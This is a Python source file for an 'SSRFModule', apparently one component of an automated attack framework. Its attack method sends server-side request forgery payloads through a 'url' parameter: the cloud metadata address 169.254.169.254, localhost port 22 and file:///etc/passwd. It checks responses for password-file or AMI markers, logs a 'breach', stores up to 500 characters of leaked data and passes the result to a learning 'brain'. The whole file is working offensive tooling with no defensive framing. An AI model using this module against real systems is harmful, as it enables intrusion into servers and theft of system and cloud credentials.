
import asyncio
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class SSRFModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "ssrf", "success": False, "risk": 9}

        request = options.get('request')
        if not request:
            return result

        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22",
            "file:///etc/passwd"
        ]

        self.logger.info(f"SSRF → {target}")

        for payload in payloads:
            try:
                resp = await request('GET', target, params={"url": payload})
                if resp and ("root:" in resp.text or "ami-id" in resp.text):
                    result.update({
                        "success": True,
                        "vulnerable_payload": payload,
                        "data_leaked": {"response": resp.text[:500]}
                    })
                    self.logger.breach(f"SSRF: {payload}")
                    if self.brain:
                        self.brain.learn("ssrf", target, payload, True, resp.text[:300])
                    break
            except:
                continue

        return result